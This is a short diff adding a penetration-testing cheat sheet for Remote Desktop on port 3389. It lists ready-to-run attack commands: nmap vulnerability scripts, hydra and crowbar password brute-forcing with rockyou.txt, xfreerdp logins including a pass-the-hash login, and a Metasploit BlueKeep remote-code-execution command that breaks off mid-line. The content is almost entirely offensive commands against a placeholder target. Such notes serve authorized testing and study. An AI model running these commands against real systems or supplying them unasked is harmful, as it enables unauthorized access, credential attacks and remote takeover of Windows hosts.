@@ -1,0 +1,13 @@
+PORT 3389 — RDP
+bashnmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 target
+
+# Brute
+hydra -l administrator -P rockyou.txt rdp://target
+crowbar -b rdp -s target/32 -U users.txt -C pass.txt
+
+# Connect
+xfreerdp /u:user /p:pass /v:target /cert-ignore
+xfreerdp /u:admin /pth:NTLM_HASH /v:target   # PTH
+
+# BlueKeep
+msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS target; s
